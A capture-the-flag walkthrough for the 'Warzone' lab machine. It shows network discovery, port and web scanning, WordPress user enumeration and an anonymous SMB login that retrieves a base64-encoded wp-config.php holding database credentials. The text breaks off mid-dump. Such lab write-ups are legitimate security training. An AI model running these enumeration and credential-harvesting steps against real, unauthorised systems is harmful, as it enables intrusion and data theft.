
# Warzone - CTF

Distributed by FIAP as a CTF challenge.


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.166   08:00:27:36:e0:36      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.166
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 15:30 -03
Nmap scan report for nac (192.168.1.166)
Host is up (0.00020s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 91:f4:4e:f6:c9:49:cf:70:7e:9f:8e:4b:3b:c5:29:5b (RSA)
|   256 57:6a:a4:1d:76:81:31:85:ce:d6:f1:9e:c5:54:ae:a4 (ECDSA)
|_  256 2f:78:e8:52:84:7f:1a:d1:98:63:d4:f2:03:a8:9a:f4 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.8-Ubuntu (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m03s, deviation: 1h43m55s, median: 3s
|_nbstat: NetBIOS name: NAC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.8-Ubuntu)
|   Computer name: nac
|   NetBIOS computer name: NAC\x00
|   Domain name: \x00
|   FQDN: nac
|_  System time: 2021-04-09T15:30:57-03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-09T18:30:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
```

## Web Analysis

```
$ dirb http://192.168.1.166

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr  9 15:31:47 2021
URL_BASE: http://192.168.1.166/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.166/ ----
+ http://192.168.1.166/index.html (CODE:200|SIZE:11321)                                                              
==> DIRECTORY: http://192.168.1.166/javascript/                                                                      
==> DIRECTORY: http://192.168.1.166/phpmyadmin/                                                                      
+ http://192.168.1.166/server-status (CODE:403|SIZE:301)                                                             
==> DIRECTORY: http://192.168.1.166/webmail/                                                                         
==> DIRECTORY: http://192.168.1.166/wordpress/                                                                       

---- Entering directory: http://192.168.1.166/javascript/ ----
==> DIRECTORY: http://192.168.1.166/javascript/jquery/                                                               

---- Entering directory: http://192.168.1.166/phpmyadmin/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/doc/                                                                  
+ http://192.168.1.166/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                                  
+ http://192.168.1.166/phpmyadmin/index.php (CODE:200|SIZE:10344)                                                    
==> DIRECTORY: http://192.168.1.166/phpmyadmin/js/                                                                   
+ http://192.168.1.166/phpmyadmin/libraries (CODE:403|SIZE:308)                                                      
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/                                                               
+ http://192.168.1.166/phpmyadmin/phpinfo.php (CODE:200|SIZE:10346)                                                  
+ http://192.168.1.166/phpmyadmin/setup (CODE:401|SIZE:460)                                                          
==> DIRECTORY: http://192.168.1.166/phpmyadmin/sql/                                                                  
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/themes/                                                               

---- Entering directory: http://192.168.1.166/webmail/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/ ----
+ http://192.168.1.166/wordpress/index.php (CODE:301|SIZE:0)                                                         
+ http://192.168.1.166/wordpress/robots.txt (CODE:200|SIZE:118)                                                      
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/                                                              
==> DIRECTORY: http://192.168.1.166/wordpress/wp-content/                                                            
==> DIRECTORY: http://192.168.1.166/wordpress/wp-includes/                                                           
+ http://192.168.1.166/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                       

---- Entering directory: http://192.168.1.166/javascript/jquery/ ----
+ http://192.168.1.166/javascript/jquery/jquery (CODE:200|SIZE:284394)                                               

---- Entering directory: http://192.168.1.166/phpmyadmin/doc/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/doc/html/                                                             

---- Entering directory: http://192.168.1.166/phpmyadmin/js/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/js/jquery/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/js/transformations/                                                   

---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/az/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/bg/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/ca/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/cs/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/da/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/de/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/el/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/es/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/et/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/fi/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/fr/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/gl/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/hu/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/ia/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/id/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/it/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/ja/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/ko/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/lt/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/nl/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/pl/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/pt/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/pt_BR/                                                         
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/ro/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/ru/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/si/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/sk/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/sl/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/sq/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/sv/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/tr/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/uk/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/vi/                                                            
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/zh_CN/                                                         
==> DIRECTORY: http://192.168.1.166/phpmyadmin/locale/zh_TW/                                                         

---- Entering directory: http://192.168.1.166/phpmyadmin/sql/ ----

---- Entering directory: http://192.168.1.166/phpmyadmin/templates/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/components/                                                 
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/database/                                                   
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/error/                                                      
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/javascript/                                                 
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/list/                                                       
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/navigation/                                                 
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/table/                                                      
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/test/                                                       

---- Entering directory: http://192.168.1.166/phpmyadmin/themes/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/themes/original/                                                      

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/ ----
+ http://192.168.1.166/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/css/                                                          
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/images/                                                       
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/includes/                                                     
+ http://192.168.1.166/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/js/                                                           
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/maint/                                                        
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/network/                                                      
==> DIRECTORY: http://192.168.1.166/wordpress/wp-admin/user/                                                         

---- Entering directory: http://192.168.1.166/wordpress/wp-content/ ----
+ http://192.168.1.166/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                              
==> DIRECTORY: http://192.168.1.166/wordpress/wp-content/languages/                                                  
==> DIRECTORY: http://192.168.1.166/wordpress/wp-content/plugins/                                                    
==> DIRECTORY: http://192.168.1.166/wordpress/wp-content/themes/                                                     
==> DIRECTORY: http://192.168.1.166/wordpress/wp-content/uploads/                                                    

---- Entering directory: http://192.168.1.166/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/phpmyadmin/doc/html/ ----
+ http://192.168.1.166/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                          

---- Entering directory: http://192.168.1.166/phpmyadmin/js/jquery/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/js/transformations/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/az/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/bg/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ca/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/cs/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/da/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/de/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/el/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/es/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/et/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/fi/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/fr/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/gl/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/hu/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ia/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/id/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/it/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ja/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ko/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/lt/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/nl/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/pl/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/pt/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/pt_BR/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ro/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/ru/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/si/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/sk/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/sl/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/sq/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/sv/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/tr/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/uk/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/vi/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/zh_CN/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/locale/zh_TW/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/components/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/database/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/error/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/javascript/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/list/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/navigation/ ----

---- Entering directory: http://192.168.1.166/phpmyadmin/templates/table/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/table/chart/                                                
==> DIRECTORY: http://192.168.1.166/phpmyadmin/templates/table/search/                                               

---- Entering directory: http://192.168.1.166/phpmyadmin/templates/test/ ----

---- Entering directory: http://192.168.1.166/phpmyadmin/themes/original/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/themes/original/css/                                                  
==> DIRECTORY: http://192.168.1.166/phpmyadmin/themes/original/img/                                                  
==> DIRECTORY: http://192.168.1.166/phpmyadmin/themes/original/jquery/                                               

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/network/ ----
+ http://192.168.1.166/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                        
+ http://192.168.1.166/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                        

---- Entering directory: http://192.168.1.166/wordpress/wp-admin/user/ ----
+ http://192.168.1.166/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                           
+ http://192.168.1.166/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                           

---- Entering directory: http://192.168.1.166/wordpress/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/wordpress/wp-content/plugins/ ----
+ http://192.168.1.166/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                      

---- Entering directory: http://192.168.1.166/wordpress/wp-content/themes/ ----
+ http://192.168.1.166/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                       

---- Entering directory: http://192.168.1.166/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.166/phpmyadmin/templates/table/chart/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/templates/table/search/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/themes/original/css/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/themes/original/img/ ----
---- Entering directory: http://192.168.1.166/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: http://192.168.1.166/phpmyadmin/themes/original/jquery/images/                                        
---- Entering directory: http://192.168.1.166/phpmyadmin/themes/original/jquery/images/ ----

-----------------
END_TIME: Fri Apr  9 15:34:09 2021
DOWNLOADED: 322840 - FOUND: 21
```

```
$ nikto -h http://192.168.1.166

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.166
+ Target Hostname:    192.168.1.166
+ Target Port:        80
+ Start Time:         2021-04-09 15:31:55 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 584eecb58a1ac, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3268: /webmail/: Directory indexing found.
+ /webmail/: Web based mail package installed.
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8067 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-04-09 15:32:48 (GMT-3) (53 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Interesting Paths:
* http://192.168.1.166/webmail/message.txt
* http://192.168.1.166/wordpress/robots.txt
* http://192.168.1.166/phpmyadmin/
* http://192.168.1.166/wordpress/

## Interesting Files Analysis

message.txt
```
$ cat message.txt

Date: 20 dez 2000
Subject: Info
From: suporte@lab.com
To: shelter@lab.com

Message:

	Ola Shelter, tudo bem?

	Precisamos realizar um backup no seu site pois havera uma manutencao programada no dia 30/12.
	Qual seria a melhor data pro backup?
	Aguardamos sua resposta.

	Atenciosamente,

	Larissa Nunes
	Gerente de Suporte
	LAB Network
```

robots.txt
```
$ cat robots.txt
Vm9jw6ogasOhIGVudW1lcm91PyBUZW0gY2VydGV6YT8gUXVlIGEgZm9yw6dhIGRvIGPDs2RpZ28g
Zm9udGUgZXN0ZWphIGNvbSB2b2PDqiEgOykgCg==

$ cat robots.txt | base64 -d
Você já enumerou? Tem certeza? Que a força do código fonte esteja com você! ;)
```

## WordPress Analysis

```
$ wpscan -e ap,at,u --url http://192.168.1.166/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.166/wordpress/ [192.168.1.166]
[+] Started: Fri Apr  9 15:47:56 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.166/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.166/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.166/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.166/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.166/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.166/wordpress/, Match: 'WordPress 5.1.1'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:36 <==================================> (22327 / 22327) 100.00% Time: 00:00:36
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://192.168.1.166/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.1.166/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://192.168.1.166/wordpress/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.166/wordpress/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.166/wordpress/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.3'

[+] twentyseventeen
 | Location: http://192.168.1.166/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.1.166/wordpress/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://192.168.1.166/wordpress/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.166/wordpress/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.166/wordpress/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.1'

[+] twentysixteen
 | Location: http://192.168.1.166/wordpress/wp-content/themes/twentysixteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.1.166/wordpress/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://192.168.1.166/wordpress/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.166/wordpress/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.166/wordpress/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.9'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] shelter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr  9 15:49:46 2021
[+] Requests Done: 22399
[+] Cached Requests: 10
[+] Data Sent: 6.188 MB
[+] Data Received: 16.658 MB
[+] Memory used: 257.16 MB
[+] Elapsed time: 00:01:49
```

Wordpress Version: 5.1.1
Wordpress User: **shelter**

## SMB Analysis

```
$ smbmap -H 192.168.1.166

[+] Guest session   	IP: 192.168.1.166:445	Name: nac                                               
    Disk                Permissions Comment
	----                ----------- -------
	print$              NO ACCESS   Printer Drivers
	public              READ ONLY   smb share
	IPC$                NO ACCESS   IPC Service (nac server (Samba, Ubuntu))

$ smbclient //192.168.1.166/public
Enter WORKGROUP\burton's password: anonymous

smb: \> dir
  .                                   D        0  Mon Mar 25 18:38:05 2019
  ..                                  D        0  Mon Mar 25 18:34:50 2019
  wp-config.php                       N     4523  Mon Mar 25 18:37:34 2019

	    8124856 blocks of size 1024. 5607656 blocks available

smb: \> get wp-config.php
getting file \wp-config.php of size 4523 as wp-config.php (1472.3 KiloBytes/sec) (average 1472.3 KiloBytes/sec)

smb: \> exit
$
```

The `wp-config.php` is Base64 encoded.
```
$ cat wp-config.php

PD9waHAKLyoqCiAqIEFzIGNvbmZpZ3VyYcOnw7VlcyBiw6FzaWNhcyBkbyBXb3JkUHJlc3MKICoK
ICogTyBzY3JpcHQgZGUgY3JpYcOnw6NvIHdwLWNvbmZpZy5waHAgdXNhIGVzc2UgYXJxdWl2byBk
dXJhbnRlIGEgaW5zdGFsYcOnw6NvLgogKiBWb2PDqiBuw6NvIHByZWNpc2EgdXNhciBvIHNpdGUs
IHZvY8OqIHBvZGUgY29waWFyIGVzdGUgYXJxdWl2bwogKiBwYXJhICJ3cC1jb25maWcucGhwIiBl
IHByZWVuY2hlciBvcyB2YWxvcmVzLgogKgogKiBFc3RlIGFycXVpdm8gY29udMOpbSBhcyBzZWd1
aW50ZXMgY29uZmlndXJhw6fDtWVzOgogKgogKiAqIENvbmZpZ3VyYcOnw7VlcyBkbyBNeVNRTAog
KiAqIENoYXZlcyBzZWNyZXRhcwogKiAqIFByZWZpeG8gZG8gYmFuY28gZGUgZGFkb3MKICogKiBB
QlNQQVRICiAqCiAqIEBsaW5rIGh0dHBzOi8vY29kZXgud29yZHByZXNzLm9yZy9wdC1icjpFZGl0
YW5kb193cC1jb25maWcucGhwCiAqCiAqIEBwYWNrYWdlIFdvcmRQcmVzcwogKi8KCi8vICoqIENv
bmZpZ3VyYcOnw7VlcyBkbyBNeVNRTCAtIFZvY8OqIHBvZGUgcGVnYXIgZXN0YXMgaW5mb3JtYcOn
w7VlcyBjb20gbyBzZXJ2acOnbyBkZSBob3NwZWRhZ2VtICoqIC8vCi8qKiBPIG5vbWUgZG8gYmFu
Y28gZGUgZGFkb3MgZG8gV29yZFByZXNzICovCmRlZmluZSggJ0RCX05BTUUnLCAnd29yZHByZXNz
JyApOw0KCi8qKiBVc3XDoXJpbyBkbyBiYW5jbyBkZSBkYWRvcyBNeVNRTCAqLwpkZWZpbmUoICdE
Ql9VU0VSJywgJ3Jvb3QnICk7DQoKLyoqIFNlbmhhIGRvIGJhbmNvIGRlIGRhZG9zIE15U1FMICov
CmRlZmluZSggJ0RCX1BBU1NXT1JEJywgJ015UDRzc3cwcmQnICk7DQoKLyoqIE5vbWUgZG8gaG9z
dCBkbyBNeVNRTCAqLwpkZWZpbmUoICdEQl9IT1NUJywgJ2xvY2FsaG9zdCcgKTsNCgovKiogQ2hh
cnNldCBkbyBiYW5jbyBkZSBkYWRvcyBhIHNlciB1c2FkbyBuYSBjcmlhw6fDo28gZGFzIHRhYmVs
YXMuICovCmRlZmluZSggJ0RCX0NIQVJTRVQnLCAndXRmOG1iNCcgKTsNCgovKiogTyB0aXBvIGRl
